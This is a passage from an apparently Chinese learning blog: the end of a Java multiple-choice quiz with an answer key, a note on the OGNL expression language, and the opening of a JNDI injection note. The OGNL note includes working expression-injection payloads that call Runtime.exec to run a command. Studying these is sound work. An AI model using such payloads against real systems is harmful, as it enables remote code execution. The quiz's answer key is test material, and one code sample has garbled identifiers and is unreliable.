<li><p>这个程序的输出是？B</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">void</span> <span class="title function_">main</span>(<span class="params"><span class="built_in">String</span>[] args</span>)&#123;</span><br><span class="line">        <span class="built_in">boolean</span> flag = <span class="literal">false</span>;</span><br><span class="line">        <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(flag?<span class="string">&quot;hello&quot;</span>:<span class="string">&quot;word&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A.hello</p>
<p>B.word</p>
<p>C.true</p>
<p>D.程序出错</p>
</li>
<li><p>使用以下方法test(),那一项是正确的？（）D</p>
<figure class="highlight processing"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">test</span>(<span class="type">int</span> num,<span class="built_in">String</span> <span class="built_in">str</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> num+<span class="built_in">str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A.test(“1”,2)</p>
<p>B.test()</p>
<p>C.test(1)</p>
<p>D.test(1,”2”)</p>
</li>
<li><p>请问以下哪个修饰符用于声明一个常量？请选择一个正确答案：B</p>
<p>A.static</p>
<p>B.final</p>
<p>C.abstract</p>
<p>D.public</p>
</li>
<li><p>设有下面两个类的定义，类 Person 和类 Student 的关系是（ ）。C</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    long id; <span class="comment">// 身份证号</span></span><br><span class="line">    <span class="type">String</span> name; <span class="comment">// 姓名</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    int score; <span class="comment">// 入学总分</span></span><br><span class="line">    int getScore()&#123;</span><br><span class="line">    <span class="keyword">return</span> score;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A.包含关系</p>
<p>B.实现关系</p>
<p>C.继承关系</p>
<p>D.没有关系</p>
</li>
<li><p>下面的代码段执行之后count的值是什么( )D</p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> <span class="built_in">count</span> = <span class="number">1</span>;</span><br><span class="line">for (<span class="built_in">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">count</span> += i;</span><br><span class="line">&#125;</span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="built_in">count</span>);</span><br></pre></td></tr></table></figure>

<p>A.5</p>
<p>B.1</p>
<p>C.15</p>
<p>D.16</p>
</li>
<li><p>while循环和 do…while循环的区别是：（ ）D</p>
<p>A.没有区别，这两个结构任何情况下效果一样</p>
<p>B.while循环比 do…while循环执行效率高</p>
<p>C.while循环是先循环后判断，所以循环体至少被执行一次</p>
<p>D.do…while循环是先循环后判断，所以循环体至少被执行一次</p>
</li>
<li><p>关于继承的说法正确的是：（ ）B</p>
<p>A.子类将继承父类所有的属性和方法</p>
<p>B.子类将继承父类的非私有属性和方法</p>
<p>C.子类只继承父类public方法和属性</p>
<p>D.子类只继承父类的方法，而不继承属性</p>
</li>
<li><p>以下关于构造函数的描述错误的是（ ）?A</p>
<p>A.构造函数的返回类型只能是void型</p>
<p>B.构造函数是类的一种特殊函数，它的方法名必须与类名相同</p>
<p>C.构造函数的主要作用是完成对类的对象的初始化工作</p>
<p>D.一般在创建新对象时，系统会自动调用构造函数</p>
</li>
<li><p>下列哪一个关键字用于实现接口？ （ ）D</p>
<p>A.extends</p>
<p>B.interface</p>
<p>C.abstract</p>
<p>D.implements</p>
</li>
<li><p>如果局部变量和成员变量同名，如何在局部变量作用域引用成员变量？( )B</p>
<p>A.不能引用，必须改名，使它们的名称不相同</p>
<p>B.在成员变量前加this，使用this访问该成员变量</p>
<p>C.在成员变量前加super，使用super访问该成员变量</p>
<p>D.不影响，系统可以自己区分</p>
</li>
<li><p>在编写异常处理的Java程序中，catch语句块应该与(    )语句块对应，使得用该语句块来启动Java的异常处理机制。A</p>
<p>A.try</p>
<p>B.switch</p>
<p>C.break</p>
<p>D.default</p>
</li>
<li><p>用关键字 private 修饰的成员变量，下列说法正确的是（）A</p>
<p>A.只能被该类自身所访问或修改</p>
<p>B.只能被同一包中的其它类访问</p>
<p>C.可以被其它包中的类访问</p>
<p>D.可以被其它包中该类的子类所访问</p>
</li>
<li><p>程序执行后，num的值应该是（ ）A</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">public  static  void  main(String[]  args)&#123;</span><br><span class="line">    int <span class="attribute">i</span>=0, <span class="attribute">j</span>=0, <span class="attribute">num</span>=0;</span><br><span class="line">    <span class="keyword">for</span>(<span class="attribute">i</span>=0; i&lt;4; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="attribute">j</span>=i; j&lt;2;j++)&#123;</span><br><span class="line">            <span class="attribute">num</span>=num+j;      </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(num);              </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A.2</p>
<p>B.4</p>
<p>C.0</p>
<p>D.3</p>
</li>
<li><p>下面关于类的封装性的描述中，错误的是（ D）。</p>
<p>A.封装体包含属性和行为</p>
<p>B.被封装的某些信息在外不可见</p>
<p>C.封装提高了可重用性</p>
<p>D.封装体中的属性和行为的访问权限相同</p>
</li>
</ol>
<h4 id="答案-1"><a href="#答案-1" class="headerlink" title="答案"></a>答案</h4><p>1-10       BBBDB BDDAA </p>
<p>11-20     ADBAD ACBBA</p>
<p>21-30     CADDC CDACB</p>
<p>31-40     ADACA DCDBC</p>
<p>41-50     ADBAA CABCD</p>
<p>51-60     DADDC DCCAA</p>
<p>61-70     DBDAC BBCCA</p>
<p>71-80     BABBD CABDA</p>
<p>81-90     BADAA  BCACA</p>
<p>91-100   DABAB BCACC</p>
<p>101-110 CCBBB CBCCC</p>
<p>111-120 ACADA BCCCD</p>
<p>121-130 CCCCA CADBC</p>
<p>131-140 ACBBC DCAAA</p>
<p>141-150 ACCDB ACBBD</p>
<p>151-161 BCDDB ADBAAA</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Order</span>&#123;</span><br><span class="line"> 	<span class="keyword">public</span> <span class="keyword">static</span> 忘了=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> price;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Order</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">		忘了++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> getP什么来着(<span class="type">double</span> price)&#123;</span><br><span class="line">        <span class="keyword">if</span>(price&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">this</span>.price+=price;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> 什么来着()&#123;</span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;%s 什么来着 %d, total:%.2f&quot;</span>,name,i,price);</span><br><span class="line">    &#125;     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>杂事</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>java Ogal</title>
    <url>/2023/09/13/ogni/</url>
    <content><![CDATA[<p>先粗略的学一下后面再来</p>
<h1 id="Ognl"><a href="#Ognl" class="headerlink" title="Ognl"></a>Ognl</h1><p>OGNL (Object Graph Navigation Language) 是一个开源的表达式引擎。通过使用OGNL，我们能够通过表达式存取Java对象树中的任意属性和调用Java对象树的方法等。也就是说，如果我们把表达式看成是一个带有语义的字符串，那么OGNL就是这个语义字符串与Java对象之间沟通的催化剂，通过OGNL，我们可以轻松解决在数据流转的过程中所碰到的各种问题。</p>
<p>对于开发者来说，使用 OGNL，可以用简洁的语法来完成对 java 对象的导航。通常来说：通过一个 “路径” 来完成对象信息的导航，这个 “路径” 可以是到 java bean 的某个属性，或者集合中的某个索引的对象，等等，而不是直接使用 get 或者 set 方法来完成。</p>
<h3 id="OGNL语法"><a href="#OGNL语法" class="headerlink" title="OGNL语法"></a>OGNL语法</h3><ul>
<li><p><code>.</code>操作符：如上所示，可以调用对象的属性和方法, <code>hacker.name</code>，且上一个节点的结果作为下一个节点的上下文，如<code>(#a=new java.lang.String(&quot;calc&quot;)).(@java.lang.Runtime@getRuntime().exec(#a))</code>，也可以换成逗号<code>(#a=new java.lang.String(&quot;calc&quot;)),(@java.lang.Runtime@getRuntime().exec(#a))</code></p>
</li>
<li><p><code>@</code>操作符：用于调用静态对象、静态方法、静态变量，<code>@java.lang.Math@abs(-10)</code></p>
</li>
<li><p><code>#</code>操作符：</p>
<p>a）用于调用非root对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 放入Context中，但不是root</span></span><br><span class="line">context.put(<span class="string">&quot;user&quot;</span>, user)</span><br><span class="line"><span class="comment">// 创建Expression，非root，所以要加上#</span></span><br><span class="line"><span class="type">String</span> <span class="variable">expression</span> <span class="operator">=</span> <span class="string">&quot;#user.name&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">ognl</span> <span class="operator">=</span> Ognl.parseExpression(expression);</span><br><span class="line"><span class="comment">// 调用</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> Ognl.getValue(ognl,context,context.getRoot());</span><br></pre></td></tr></table></figure>

<p>b）创建Map</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;chenlvtang&quot;</span>, <span class="string">&quot;level&quot;</span>: <span class="string">&quot;noob&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>c）定义变量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#a=<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>$</code>操作符：一般用于配置文件，<code>&lt;param name=&quot;name&quot;&gt;$&#123;name&#125;&lt;/param&gt;</code></p>
</li>
<li><p><code>%</code>操作符：计算其中的OGNL表达式，<code>%&#123;hacker.name&#125;</code></p>
</li>
<li><p>List：直接使用<code>&#123;&quot;green&quot;, &quot;red&quot;, &quot;blue&quot;&#125;</code>创建</p>
</li>
<li><p>对象创建：<code>new java.lang.String[]&#123;&quot;foobar&quot;&#125;</code></p>
</li>
</ul>
<h2 id="三要素"><a href="#三要素" class="headerlink" title="三要素"></a>三要素</h2><ul>
<li><p><strong>表达式（Expression）</strong>：</p>
<p>表达式是整个 OGNL 的核心内容，所有的 OGNL 操作都是针对表达式解析后进行的。通过表达式来告诉 OGNL 操作到底要干些什么。因此，表达式其实是一个带有语法含义的字符串，整个字符串将规定操作的类型和内容。OGNL 表达式支持大量的表达式，如 “链式访问对象”、表达式计算、甚至还支持 Lambda 表达式。</p>
</li>
<li><p><strong>Root 对象</strong>：</p>
<p>OGNL 的 Root 对象可以理解为 OGNL 的操作对象。当我们指定了一个表达式的时候，我们需要指定这个表达式针对的是哪个具体的对象。而这个具体的对象就是 Root 对象，这就意味着，如果有一个 OGNL 表达式，那么我们需要针对 Root 对象来进行 OGNL 表达式的计算并且返回结果。</p>
</li>
<li><p><strong>上下文环境</strong>：</p>
<p>有个 Root 对象和表达式，我们就可以使用 OGNL 进行简单的操作了，如对 Root 对象的赋值与取值操作。但是，实际上在 OGNL 的内部，所有的操作都会在一个特定的数据环境中运行。这个数据环境就是上下文环境（Context）。OGNL 的上下文环境是一个 Map 结构，称之为 OgnlContext。Root 对象也会被添加到上下文环境当中去。</p>
<p>说白了上下文就是一个 MAP 结构，它实现了 java.utils.Map 的接口。</p>
</li>
</ul>
<h2 id="使用Ognl"><a href="#使用Ognl" class="headerlink" title="使用Ognl"></a>使用Ognl</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;ognl&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;ognl&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;<span class="number">3.1</span><span class="number">.19</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>示例代码：</p>
<p>示例类：<code>sample.ognl.Address</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Address</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> String port;</span><br><span class="line">	<span class="keyword">private</span> String address;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Address</span><span class="params">(String port,String address)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.port = port;</span><br><span class="line">		<span class="built_in">this</span>.address = address;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="OgnlContext对象"><a href="#OgnlContext对象" class="headerlink" title="OgnlContext对象"></a>OgnlContext对象</h3><p>OgnlContext对象是ognl表达式语言的核心。<br>但是项目中不会要求写OgnlContext的代码，Ognl标签其实是调用了OgnlContext对象。所以只做了解即可。</p>
<p>OgnlContext对象在源码中实现了Map接口：<br><code>public class OgnlContext implements Map &#123;……&#125;</code></p>
<p>Ognl表达式语言取值，也是用java代码取值的，原理就是使用OgnlContext和Ognl这两个类，<strong>只需要记住，Ognl取根元素不用#号，取非根元素要使用#号</strong>：</p>
<p><strong>OgnlContext类</strong><br>硬编码方式，了解OgnlContext对象，因为OgnlContext对象实现是Map接口，所有OgnlContext本质就是一个Map，可以使用map方法：</p>
<blockquote>
<p>OgnlContext context &#x3D; new OgnlContext();<br>context.put(“uesr”,user);<br>context.put(“address”,address);<br>context.setRoot(address);</p>
</blockquote>
<p><strong>Ognl类</strong><br>Ognl类也是Ognl底层运行的代码，常用的api如下：</p>
<blockquote>
<p>Object obj1 &#x3D; Ognl.parseExpression(“country”); 解析ognl表达式<br>Ognl.getValue(obj1, context, context.getRoot()); 获取ognl的表达式值,obj1是上面一个api，其他两个分别是创建的上下文对象以及一个不用修改的参数<br>Object obj2 &#x3D; Ognl.parseExpression(“language.toUpperCase()”); 方法调用<br>Object obj3 &#x3D; Ognl.parseExpression(“@java.lang.Integer@toBinaryString(10)”);等同于上面<br>Object obj4 &#x3D; Ognl.parseExpression(“@@min(10,4)”); Math类的方法直接调用,静态方法的调用</p>
</blockquote>
<p>代码示例如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> o_ognl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ognl.Ognl;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlContext;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlException;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * OgnlContext用法</span></span><br><span class="line"><span class="comment"> * 1.使用Ognl表达式语言取值，如果取非根元素的值，必须用#号</span></span><br><span class="line"><span class="comment"> * 2.使用Ognl表达式语言取值，如果取根元素的值，不用#号</span></span><br><span class="line"><span class="comment"> * 3.Ognl可以调用静态方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OgnlDemo</span> &#123;</span><br><span class="line">    <span class="comment">//非根元素</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testOgnl1</span><span class="params">()</span> <span class="keyword">throws</span> OgnlException &#123;</span><br><span class="line">        <span class="comment">//创建一个Ognl上下文对象</span></span><br><span class="line">        <span class="type">OgnlContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OgnlContext</span>();</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 1.OgnlContext放入基本变量数据</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">//放入数据</span></span><br><span class="line">        context.put(<span class="string">&quot;cn&quot;</span>,<span class="string">&quot;China&quot;</span>);</span><br><span class="line">        <span class="comment">//获取数据（map）</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> (String)context.get(<span class="string">&quot;cn&quot;</span>);</span><br><span class="line">        System.out.println(value);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 2.OgnlContext放入对象数据</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">//创建对象，设置对象属性</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setId(<span class="number">100</span>);</span><br><span class="line">        user.setName(<span class="string">&quot;Jack&quot;</span>);</span><br><span class="line">        <span class="comment">//【往非根元素放入数据，取值的时候表达式要用“#”】</span></span><br><span class="line">        context.put(<span class="string">&quot;user&quot;</span>,user);</span><br><span class="line">        <span class="comment">//获取对象属性</span></span><br><span class="line">        <span class="comment">//使用这种方式也可以获取</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">s</span> <span class="operator">=</span> context.get(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        <span class="comment">//使用Ognl表达式来获取</span></span><br><span class="line">        <span class="comment">//举例：例如标签&lt;s:a value=&quot;#user.id&quot;&gt;取值，实际上就是运行了下面的代码获取的</span></span><br><span class="line">        <span class="comment">//先构建一个Ognl表达式，再解析表达式</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">ognl</span> <span class="operator">=</span> Ognl.parseExpression(<span class="string">&quot;#user.id&quot;</span>);<span class="comment">//构建Ognl表达式</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> Ognl.getValue(ognl, context, context.getRoot());<span class="comment">//解析表达式</span></span><br><span class="line">        System.out.println(value1);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user1.setId(<span class="number">100</span>);</span><br><span class="line">        user1.setName(<span class="string">&quot;Jack&quot;</span>);</span><br><span class="line">        context.setRoot(user1);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ognl1</span> <span class="operator">=</span> Ognl.parseExpression(<span class="string">&quot;id&quot;</span>);<span class="comment">//构建Ognl表达式</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> Ognl.getValue(ognl1, context, context.getRoot());<span class="comment">//解析表达式</span></span><br><span class="line">        System.out.println(value2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//根元素，</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testOgnl2</span><span class="params">()</span> <span class="keyword">throws</span> OgnlException &#123;</span><br><span class="line">        <span class="type">OgnlContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OgnlContext</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">User</span> <span class="variable">user1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user1.setId(<span class="number">100</span>);</span><br><span class="line">        user1.setName(<span class="string">&quot;Jack&quot;</span>);</span><br><span class="line">        context.setRoot(user1);</span><br><span class="line">        <span class="comment">//根元素直接使用id,不需要加#号</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">ognl1</span> <span class="operator">=</span> Ognl.parseExpression(<span class="string">&quot;id&quot;</span>);<span class="comment">//构建Ognl表达式</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> Ognl.getValue(ognl1, context, context.getRoot());<span class="comment">//解析表达式</span></span><br><span class="line">        System.out.println(value2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ognl对静态方法调用的支持</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testOgnl3</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//创建一个Ognl上下文对象</span></span><br><span class="line">        <span class="type">OgnlContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OgnlContext</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Ognl表达式语言，调用类的静态方法</span></span><br><span class="line"><span class="comment">//        Object ognl = Ognl.parseExpression(&quot;@Math@floor(10.9)&quot;);</span></span><br><span class="line">        <span class="comment">//由于Math类在开发中比较常用，所有也可以这样写</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">ognl</span> <span class="operator">=</span> Ognl.parseExpression(<span class="string">&quot;@@floor(10.9)&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> Ognl.getValue(ognl, context, context.getRoot());</span><br><span class="line">        System.out.println(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ValueStack对象"><a href="#ValueStack对象" class="headerlink" title="ValueStack对象"></a>ValueStack对象</h3><p>等以后学struts再来学</p>
<p><a href="https://www.cnblogs.com/cenyu/p/6233942.html">https://www.cnblogs.com/cenyu/p/6233942.html</a></p>
<p><a href="https://jueee.github.io/2020/08/2020-08-15-Ognl%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/">https://jueee.github.io/2020/08/2020-08-15-Ognl%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</a></p>
<h2 id="表达式注入"><a href="#表达式注入" class="headerlink" title="表达式注入"></a>表达式注入</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyOGNL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> OgnlException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">expression</span> <span class="operator">=</span> <span class="string">&quot;@java.lang.Runtime@getRuntime().exec(&#x27;calc&#x27;)&quot;</span>;</span><br><span class="line">        <span class="type">OgnlContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OgnlContext</span>();</span><br><span class="line">        Ognl.getValue(expression, context, context.getRoot());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行后，成功弹出计算器。</p>
<h3 id="OGNL-高版本下的黑名单"><a href="#OGNL-高版本下的黑名单" class="headerlink" title="OGNL 高版本下的黑名单"></a>OGNL 高版本下的黑名单</h3><p>OGNL在&gt;&#x3D;3.1.25、&gt;&#x3D;3.2.12的版本中增加了黑名单。我们将依赖更新为3.1.25，然后再次运行，就会得到一个报错信息</p>
<p>发现禁用了这些能命令执行的函数或者类</p>
<p><a href="https://chenlvtang.top/2022/08/11/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%B9%8BOGNL/">https://chenlvtang.top/2022/08/11/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%B9%8BOGNL/</a></p>
<p><a href="http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#0x03-OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#0x03-OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E</a></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>jndi注入</title>
    <url>/2023/08/20/jndi/</url>
    <content><![CDATA[<p>JNDI是java命名与目录接口，，JNDI可访问的现有的目录以及服务有：JDBC，LDAP，RMI，NID，CORBA。jndi是对各种访问目录服务的逻辑进行了再封装,也就是以前我们访问rmi与ldap要写的代码差别很大，但是有了jndi这一层，我们就可以用jndi的方式来轻松访问rmi或者ldap服务，这样访问不同的服务的代码实现基本是一样的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">其它一些概念：</span><br><span class="line"><span class="number">1</span>）Naming Service 命名服务 命名服务将名称和对象进行关联，提供通过名称找到对象的操作。 例如：DNS系统将计算机名和IP地址进行关联。文件系统将文件名和文件句柄进行关联等等。</span><br><span class="line"><span class="number">2</span>）Name 名称 要在命名系统中查找对象，需要提供对象的名称。对象的名称是用来标识该对象的易于人理解的名称。 例如：文件系统用文件名来标识文件对象。DNS系统用机器名来表示IP地址。</span><br><span class="line"><span class="number">3</span>）Binding 绑定 一个名称和一个对象的关联称为一个绑定。 例如：文件系统中，文件名绑定到文件。DNS系统中，机器名绑定到IP地址。</span><br><span class="line"><span class="number">4</span>）Reference 引用 在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用。引用包含了如何访问实际对象的信息。</span><br><span class="line"><span class="number">5</span>）Context 上下文 一个上下文是一系列名称和对象的绑定的集合。一个上下文通常提供一个lookup操作来返回对象，也可能提供绑定，解除绑定，列举绑定名等操作。</span><br></pre></td></tr></table></figure>

<p>JNDI注入依赖RMI,JNDI底层支持RMI远程对象，RMI注册的服务可以直接被JNDI接口访问调用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>服务器创建好继承于Remote接口的类，并把它绑定到RMI服务器上</span><br><span class="line"><span class="number">2.</span>客户端请求RMI服务器上的类</span><br><span class="line"><span class="number">3.</span>服务端返回客户端所请求类的存根stub，客户端将这个stub看作实例化对象使用</span><br><span class="line"><span class="number">4.</span>客户端调用stub的某个方法，并传入参数。该参数会发送到RMI服务器上，由RMI服务器按照客户端传来的参数来执行指定的方法</span><br><span class="line"><span class="number">5.</span>服务器执行完后将结果返回给客户端</span><br><span class="line">所以从RMI这一端来看，客户端获取了远程对象后所执行的此对象的方法，都是由RMI服务器来执行的。</span><br></pre></td></tr></table></figure>

<h2 id="JNDI调用过程"><a href="#JNDI调用过程" class="headerlink" title="JNDI调用过程"></a>JNDI调用过程</h2><p>JNDI调用其实包含三个部分：</p>
<p>1）client 2)RMI Registry 3）Server</p>
<p>客户端访问注册端口请求相应的服务，注册端口将服务信息返回给客户端，客户端在启动一个端口去访问服务。所以其实从客户端角度看，服务端应用是有两个端口的，一个是RMI Registry端口（默认为1099），另一个是远程对象的通信端口（随机分配的）</p>
<p><img src="https://baicany.github.io/images/1676898601_63f37129234698b7660f5.png!small" alt="1676898601_63f37129234698b7660f5.png!small?1676898600047"></p>
<h2 id="JNDI简单实现"><a href="#JNDI简单实现" class="headerlink" title="JNDI简单实现"></a>JNDI简单实现</h2><p>1）JNDI中有绑定和查找的方法：</p>
<p>bind: 将第一个参数绑定到第二个参数的对象上面</p>
<p>lookup：通过提供的名称查找对象（如何这个参数可控，就可能导致漏洞出现）</p>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p><strong>先设置并启动一个服务端RMI</strong></p>
<p>IHello.java #定义一个接口，后面用具体的类实现它</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IHello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

